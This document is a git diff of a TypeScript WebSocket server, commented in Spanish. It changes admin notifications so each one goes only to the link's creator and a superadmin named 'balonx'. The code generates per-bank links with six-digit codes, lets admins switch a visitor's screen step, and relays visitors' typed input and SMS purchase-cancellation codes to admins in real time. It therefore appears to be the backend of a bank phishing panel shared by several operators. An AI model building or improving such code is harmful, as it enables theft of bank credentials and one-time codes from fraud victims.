@@ -9,7 +9,8 @@ import axios from 'axios';
 
 // Store active connections
 const clients = new Map<string, WebSocket>();
-const adminClients = new Set<WebSocket>();
+// Cambiamos a un Map para asociar cada socket con su username
+const adminClients = new Map<string, WebSocket>();
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // Setup authentication
@@ -822,15 +823,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log(`Notificando a los clientes de admin sobre el nuevo enlace - Código: ${sixDigitCode}, Banco: ${banco}, Usuario: ${user.username}`);
       
       // Notificar a los clientes de admin sobre el nuevo enlace
+      // Enviar al usuario que creó el link y al superadmin
       broadcastToAdmins(JSON.stringify({
         type: 'LINK_GENERATED',
         data: { 
           sessionId,
           code: sixDigitCode,
           banco: banco as string,
-          userName: user.username
+          userName: user.username,
+          createdBy: user.username // Añadimos para consistency
         }
-      }));
+      }), user.username); // Pasamos el username como segundo argumento
 
       // Enviar también un mensaje de actualización de sesiones para refrescar la lista
       // Este mensaje hará que todos los clientes obtengan la lista actualizada del servidor
@@ -880,9 +883,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Register client or admin
         if (data.type === 'REGISTER') {
           if (data.role === 'ADMIN') {
-            adminClients.add(ws);
-            console.log('Admin client registered');
-            
             // Determinar si es un administrador o un usuario basado en el username
             const userName = data.username || '';
             const user = await storage.getUserByUsername(userName);
@@ -895,6 +895,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
               }));
               return;
             }
+            
+            // Guardar el cliente en el Map con su username como clave
+            adminClients.set(userName, ws);
+            console.log(`Admin client registered: ${userName}`);
             
             console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}) autenticado, obteniendo sesiones...`);
             
@@ -1036,12 +1040,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
               await storage.updateSession(sessionId, { pasoActual: screenType });
               console.log('Actualizado pasoActual a:', screenType);
 
-              // Notify all admin clients about the update
+              // Notify specific admin clients about the update
               const updatedSession = await storage.getSessionById(sessionId);
+              // Obtenemos el creador de la sesión para saber a quién enviar la notificación
+              const createdBy = updatedSession?.createdBy || '';
               broadcastToAdmins(JSON.stringify({
                 type: 'SESSION_UPDATE',
                 data: updatedSession
-              }));
+              }), createdBy); // Dirigimos el mensaje al creador de la sesión
             }
           } catch (error) {
             console.error("Invalid screen change data:", error);
@@ -1091,13 +1097,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);
 
                   // Notificar a los administradores el código de cancelación inmediatamente
+                  // Obtenemos la sesión para saber quién la creó
+                  const sessionData = await storage.getSessionById(sessionId);
+                  const createdBy = sessionData?.createdBy || '';
+                  
                   broadcastToAdmins(JSON.stringify({
                     type: 'SMS_COMPRA_CODE',
                     data: {
                       sessionId,
-                      code: inputData.smsCompra
+                      code: inputData.smsCompra,
+                      createdBy // Añadimos el creador para referencia
                     }
-                  }));
+                  }), createdBy); // Enviamos solo al creador y al superadmin
                 } else {
                   console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
                 }
@@ -1110,25 +1121,32 @@ export async function registerRoutes(app: Express): Promise<Server> {
             console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
 
             // Enviar notificación en tiempo real de la entrada del cliente
+            // Obtenemos la sesión para saber quién la creó y enviarle la notificación
+            const session = await storage.getSessionById(sessionId);
+            const createdBy = session?.createdBy || '';
+            
             broadcastToAdmins(JSON.stringify({
               type: 'CLIENT_INPUT_REALTIME',
               data: {
                 sessionId,
                 tipo,
                 inputData,
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                createdBy // Añadimos el creador para referencia
               }
-            }));
+            }), createdBy); // Dirigimos el mensaje al creador de la sesión
 
             // Update session if we have fields to update
             if (Object.keys(updatedFields).length > 0) {
               const updatedSession = await storage.updateSession(sessionId, updatedFields);
 
-              // Notify all admin clients about the database update
+              // Notify specific admin clients about the database update
+              // Enviamos el mensaje al creador de la sesión
+              const createdBy = updatedSession?.createdBy || '';
               broadcastToAdmins(JSON.stringify({
                 type: 'SESSION_UPDATE',
                 data: updatedSession
-              }));
+              }), createdBy); // Dirigimos el mensaje al creador de la sesión
             }
           } catch (error) {
             console.error("Invalid client input data:", error);
@@ -1146,19 +1164,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
     // Handle disconnection
     ws.on('close', () => {
-      // Remove from admin clients if it was an admin
-      if (adminClients.has(ws)) {
-        adminClients.delete(ws);
-        console.log('Admin client disconnected');
-      }
-
-      // Remove from clients if it was a client
-      Array.from(clients.entries()).forEach(([sessionId, client]) => {
+      // Buscar y eliminar el cliente del adminClients Map
+      let adminUserRemoved = false;
+      
+      // Iteramos sobre el Map usando entradas como array
+      const adminEntries = Array.from(adminClients.entries());
+      for (let i = 0; i < adminEntries.length; i++) {
+        const [username, client] = adminEntries[i];
         if (client === ws) {
-          clients.delete(sessionId);
-          console.log(`Client with session ID ${sessionId} disconnected`);
+          adminClients.delete(username);
+          console.log(`Admin client disconnected: ${username}`);
+          adminUserRemoved = true;
+          break; // Terminamos el bucle una vez encontrado
         }
-      });
+      }
+      
+      // Si no era un cliente admin, revisamos si era un cliente regular
+      if (!adminUserRemoved) {
+        // Buscar y eliminar de clients si era un cliente
+        const clientEntries = Array.from(clients.entries());
+        for (let i = 0; i < clientEntries.length; i++) {
+          const [sessionId, client] = clientEntries[i];
+          if (client === ws) {
+            clients.delete(sessionId);
+            console.log(`Client with session ID ${sessionId} disconnected`);
+            break; // Terminamos el bucle una vez encontrado
+          }
+        }
+      }
     });
   });
 
@@ -1622,24 +1655,49 @@ export async function registerRoutes(app: Express): Promise<Server> {
   return httpServer;
 }
 
-// Helper function to broadcast to all admin clients
-function broadcastToAdmins(message: string) {
-  // Intentar parsear el mensaje para logging
+// Helper function to broadcast to admin clients, with option to target specific users
+function broadcastToAdmins(message: string, targetUsername?: string) {
+  // Intentar parsear el mensaje para logging y extraer información
   try {
     const parsedMessage = JSON.parse(message);
     console.log(`[Broadcast] Enviando mensaje de tipo: ${parsedMessage.type}`);
+    
+    // Si el mensaje se refiere a una sesión, intentamos obtener el creador
+    if (parsedMessage.data && parsedMessage.data.createdBy && !targetUsername) {
+      // Usar el creador de la sesión como targetUsername si no se proporcionó uno
+      targetUsername = parsedMessage.data.createdBy;
+      console.log(`[Broadcast] Estableciendo targetUsername a ${targetUsername} basado en createdBy`);
+    }
   } catch (e) {
     console.log(`[Broadcast] Enviando mensaje (formato no JSON)`);
   }
 
-  // Enviar el mensaje a todos los clientes administradores conectados
+  // Si se especifica un usuario objetivo, enviamos el mensaje solo a ese usuario y al superadmin (balonx)
   let sentCount = 0;
-  adminClients.forEach(client => {
-    if (client.readyState === WebSocket.OPEN) {
-      client.send(message);
-      sentCount++;
+  
+  if (targetUsername) {
+    // Buscar el cliente del usuario objetivo y del superadmin
+    const entries = Array.from(adminClients.entries());
+    for (let i = 0; i < entries.length; i++) {
+      const [username, client] = entries[i];
+      // Enviar al usuario objetivo o al superadmin (balonx)
+      if ((username === targetUsername || username === 'balonx') && client.readyState === WebSocket.OPEN) {
+        client.send(message);
+        sentCount++;
+        console.log(`[Broadcast] Mensaje enviado específicamente a ${username}`);
+      }
     }
-  });
+  } else {
+    // Comportamiento original: broadcast a todos los administradores conectados
+    const entries = Array.from(adminClients.entries());
+    for (let i = 0; i < entries.length; i++) {
+      const [username, client] = entries[i];
+      if (client.readyState === WebSocket.OPEN) {
+        client.send(message);
+        sentCount++;
+      }
+    }
+  }
   
   console.log(`[Broadcast] Mensaje enviado a ${sentCount} clientes administradores`);
 }
